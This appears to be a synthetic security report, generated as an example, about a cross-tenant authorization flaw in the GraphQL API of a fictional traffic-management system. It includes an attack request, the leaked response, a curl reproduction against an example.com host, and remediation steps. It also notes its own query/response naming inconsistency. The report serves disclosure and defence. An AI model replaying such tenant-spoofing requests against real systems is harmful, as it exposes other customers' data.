# Security Analysis Report
**System:** MetroPulse Traffic Orchestration
**Domain:** Smart City / Traffic Management
**Example ID:** GQL-0304
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Logging Failures — Pattern 7.1 | Operational PII/PHI leakage via `listIntersections` — attacker retrieves sensitive traffic control records across tenant boundaries, exposing sensitive operational data |

---

## Finding 1 — Logging Failures: Operational PII Leakage via Cross-Tenant List Query (Pattern 7.1)

### Summary
The `listIntersections` resolver on MetroPulse Traffic Orchestration (`api.metropulse-traffic-o.example.com`) accepts a client-supplied `tenantId` parameter and does not validate it against the JWT's `tenantId`. Per §5.0 Pattern 7.1, sensitive operational data is leaked across tenant boundaries. The resolver does not enforce ownership or tenancy boundaries, enabling retrieval of another tenant's intersection/traffic control node data. The exposed `sensitiveField` and `internalNotes` within the response constitute operational PII leakage.

**Context.txt inconsistency (documented):** HAR query uses `listIntersections(tenantId: "tenant-387e")`, but the response key in §6.0 is `getIntersection`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`listIntersections`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `nodeId` only (no user/tenant dimension), enabling cross-tenant cache poisoning.

**Pattern:** 7.1 — Operational PII/PHI leakage (Logging Failures)
**Affected resolver:** `listIntersections`
**Affected endpoint:** `POST https://api.metropulse-traffic-o.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.metropulse-traffic-o.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-d4c1

{"query": "query VulnerableOp { listIntersections(tenantId: \"tenant-387e\") { nodeId ownerId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Intersection Data Returned (cross-tenant)**
```json
{
  "data": {
    "getIntersection": {
      "tenantId": "tenant-387e",
      "ownerId": "other-user-d4c1387e",
      "data": {
        "sensitiveField": "CONFIDENTIAL-d4c1387e",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-d4c1`. Returned data belongs to: `tenant-387e`. Cross-tenant operational data leakage confirmed.

**Context.txt inconsistency:** HAR sends `listIntersections` query; response body uses key `getIntersection`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.metropulse-traffic-o.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-d4c1" \
  -d '{"query": "query VulnerableOp { listIntersections(tenantId: \"tenant-387e\") { nodeId ownerId data { sensitiveField } } }"}'
# Vulnerable: data contains tenant-387e intersection records for attacker tenant-d4c1
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `listIntersections` resolver: derive `tenantId` exclusively from JWT claims. Reject client-supplied `tenantId`.
2. In `getIntersection` resolver: assert `fetched.tenantId === jwt.tenantId`. Return 403 on mismatch.
3. Re-key Redis cache to include `tenantId` (e.g., `tenant:{tenantId}:node:{nodeId}`).
4. Ensure sensitive operational fields (`sensitiveField`, `internalNotes`) are not returned without explicit authorization.
